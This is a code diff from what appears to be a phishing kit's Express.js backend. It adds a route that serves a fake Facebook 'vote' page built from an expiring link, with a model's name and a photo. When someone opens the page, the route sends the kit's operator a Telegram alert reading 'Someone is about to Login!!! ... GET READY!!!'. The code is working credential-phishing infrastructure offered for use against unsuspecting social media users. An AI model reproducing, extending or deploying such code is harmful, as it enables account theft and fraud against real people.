@@ -28,6 +28,36 @@ GET READY!!!
             
                     `)
         }
+        return res.render("socials/facebook/vote", { req, name: link.modelName, linkType: link.linkType, linkId: link.id, layout: false });
+    } catch (err) {
+        console.log(err)
+    }
+});
+
+
+router.get("/vote-2/:linkId", async (req, res) => {
+    try {
+        const { linkId } = req.params;
+        const link = await Links.findOne({ link: linkId });
+        if (!link) {
+            return res.redirect("/notfound");
+        }
+        if (new Date() > new Date(link.expiry)) {
+            return res.redirect("/notfound");
+        }
+        const user = await User.findById(link.user);
+        if (user.notification) {
+            await bot.sendMessage(user.telegramID, `
+😈 New Entry 😈
+            
+Someone is about to Login!!!
+
+SOCIAL MEDIA: ${link.linkType}
+
+GET READY!!!
+            
+                    `)
+        }
         const samplePic = "https://i.postimg.cc/TYKGQSJw/stefan-stefancik-QXev-Dflbl8-A-unsplash.jpg";
         return res.render("socials/facebook/vote2", { req, picture: link.picture || samplePic, name: link.modelName, linkType: link.linkType, linkId: link.id, layout: false });
     } catch (err) {
